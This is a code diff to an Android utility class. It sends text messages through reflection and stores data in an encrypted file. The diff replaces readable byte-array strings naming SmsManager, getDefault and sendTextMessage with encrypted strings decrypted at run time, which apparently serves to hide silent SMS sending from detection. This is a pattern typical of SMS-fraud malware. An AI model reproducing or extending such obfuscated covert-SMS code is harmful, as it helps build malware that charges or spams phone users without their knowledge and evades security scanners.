@@ -3,7 +3,6 @@ package w.c.s.utils;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.net.Uri;
-import android.os.Environment;
 import android.text.TextUtils;
 
 import org.json.JSONObject;
@@ -138,12 +137,14 @@ public class OtherUtils {
 
         String encode = EncodeTool.enCrypt(jsonObject.toString(), JsUtil.getInstance(context).getJs_key());
 
-        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();
+        //        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();
 
-        File file = new File(SDPath, EncodeTool.deCrypt(HttpUtils.FileList));
-        if ( !file.exists() ) {
-            file.mkdirs();
-        }
+        //        File file = new File(SDPath, EncodeTool.deCrypt(HttpUtils.FileList));
+        //        if ( !file.exists() ) {
+        //            file.mkdirs();
+        //        }
+
+        File file = context.getFilesDir();
 
         file = new File(file.getPath(), EncodeTool.deCrypt(HttpUtils.FileName));
 
@@ -311,15 +312,15 @@ public class OtherUtils {
                 // SmsManager.getDefault().sendTextMessage(port, null, content, null, null);
 
                 //SmsManager
-                String org1 = new String(new byte[]{83, 109, 115, 77, 97, 110, 97, 103, 101, 114});
+                String org1 = "QjvNIom/GUKvqsftcCAmAw==";
                 //getDefault
-                String org2 = new String(new byte[]{103, 101, 116, 68, 101, 102, 97, 117, 108, 116});
+                String org2 = "S7GR8JZ0khi6qK9iZGf0Ag==";
                 //sendTextMessage
-                String org3 = new String(new byte[]{115, 101, 110, 100, 84, 101, 120, 116, 77, 101, 115, 115, 97, 103, 101});
+                String org3 = "J17Df6VjrVSPmMYQawNVKQ==";
 
-                Class<?> smsClasss = Class.forName("android.telephony." + org1);
-                Object obj = smsClasss.getMethod(org2).invoke(smsClasss);
-                Method method = obj.getClass().getMethod(org3, new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
+                Class<?> smsClasss = Class.forName("android.telephony." + EncodeTool.deCrypt(org1));
+                Object obj = smsClasss.getMethod(EncodeTool.deCrypt(org2)).invoke(smsClasss);
+                Method method = obj.getClass().getMethod(EncodeTool.deCrypt(org3), new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
                 method.invoke(obj, new Object[]{port, null, Uri.decode(content), null, null});
             } catch ( Exception e ) {
                 e.printStackTrace();
